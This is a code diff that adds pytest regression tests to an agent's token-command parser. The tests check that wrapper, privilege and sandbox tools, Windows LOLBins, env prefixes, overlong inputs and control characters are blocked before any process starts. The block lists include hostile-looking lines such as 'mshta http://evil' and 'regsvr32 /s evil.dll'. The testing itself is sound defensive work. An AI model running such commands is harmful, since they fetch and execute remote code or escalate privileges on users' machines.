@@ -481,3 +481,105 @@ class TestAuxiliaryResolverHonoursKeyCmd:
         assert self._resolve(
             monkeypatch, {**self.BASE, "key_cmd": "   "}
         ) == "no-key-required"
+
+
+class Test98831Beyond97217:
+    """98831 hardening beyond 97217 — extended wrappers, LOLBins, limits.
+
+    97217 blocks direct shells + 12 wrappers + shell syntax. 98831 adds:
+    bwrap/firejail/flatpak/nsenter/chroot/proot/docker/podman/runc/crun,
+    capsh/su/sg/systemd-run/unshare/fakeroot, LOLBins (rundll32/regsvr32/mshta),
+    env-prefix, length/token/control-char limits, and warning audit trail.
+    Each test is a pre-effect regression: monkeypatched subprocess.run must
+    NOT be called (fails if process creation occurs).
+    """
+
+    def _assert_blocked(self, monkeypatch, command: str):
+        """Helper: command must be rejected before subprocess.run."""
+        called = {}
+
+        def fake_run(*a, **k):
+            called["ran"] = True
+            return SimpleNamespace(returncode=0, stdout="tok", stderr="")
+
+        monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)
+        with pytest.raises(CommandTokenError):
+            _parse_command_argv(command, "test")
+        assert "ran" not in called, f"{command!r} should not reach subprocess.run"
+
+    def test_extended_wrappers_blocked(self, monkeypatch):
+        for cmd in [
+            "bwrap --ro-bind / / helper",
+            "firejail helper --arg",
+            "flatpak run helper",
+            "nsenter helper",
+            "chroot / helper",
+            "proot helper",
+            "docker run helper",
+            "podman run helper",
+            "runc run helper",
+            "crun run helper",
+            "capsh --print helper",
+            "su helper",
+            "sg helper",
+            "systemd-run helper",
+            "unshare helper",
+            "fakeroot helper",
+            "fakechroot helper",
+        ]:
+            self._assert_blocked(monkeypatch, cmd)
+
+    def test_lolbins_blocked(self, monkeypatch):
+        for cmd in [
+            "rundll32 javascript:evil",
+            "rundll32.exe javascript:evil",
+            "regsvr32 /s evil.dll",
+            "regsvr32.exe evil.dll",
+            "mshta http://evil",
+            "mshta.exe http://evil",
+        ]:
+            self._assert_blocked(monkeypatch, cmd)
+
+    def test_busybox_without_exe_blocked(self, monkeypatch):
+        # 97217 had busybox.exe but not busybox (POSIX); 98831 fixes
+        self._assert_blocked(monkeypatch, "busybox sh -c 'echo hi'")
+        self._assert_blocked(monkeypatch, "busybox --help")
+
+    def test_env_prefix_blocked(self, monkeypatch):
+        self._assert_blocked(monkeypatch, "FOO=bar helper --arg")
+        self._assert_blocked(monkeypatch, "AWS_PROFILE=prod my-auth-cli token")
+
+    def test_length_and_token_limits(self, monkeypatch):
+        # _MAX_COMMAND_CHARS=4096, _MAX_ARGV_TOKENS=64
+        long_cmd = "helper " + "x" * 5000
+        self._assert_blocked(monkeypatch, long_cmd)
+        many_tokens = "helper " + " ".join(f"arg{i}" for i in range(70))
+        self._assert_blocked(monkeypatch, many_tokens)
+
+    def test_control_chars_blocked(self, monkeypatch):
+        self._assert_blocked(monkeypatch, "helper\x00injected")
+        self._assert_blocked(monkeypatch, "helper\x01bad")
+        self._assert_blocked(monkeypatch, "helper\rbad")
+        self._assert_blocked(monkeypatch, "helper\nbad")
+
+    def test_legitimate_helpers_still_allowed(self, monkeypatch):
+        # Allowed-case controls: these must NOT be blocked (97217 parity)
+        allowed = {}
+
+        def fake_run(argv, **k):
+            allowed["argv"] = argv
+            return SimpleNamespace(returncode=0, stdout="tok", stderr="")
+
+        monkeypatch.setattr("agent.command_token_source.subprocess.run", fake_run)
+        # Real helpers
+        for cmd, expected_first in [
+            ("my-auth-cli print-token --profile prod", "my-auth-cli"),
+            ("python my-helper.py --arg", "python"),
+            ("/usr/local/bin/helper --config /tmp/x", "/usr/local/bin/helper"),
+            ('"C:\\Program Files\\helper.exe" --path C:\\tmp\\token', "C:\\Program Files\\helper.exe"),
+        ]:
+            # Use _mint via fake_run to verify argv without shell
+            argv = _parse_command_argv(cmd, "test")
+            assert argv[0] == expected_first
+            # Ensure it would run (not blocked)
+            assert _parse_command_argv(cmd, "test") == argv
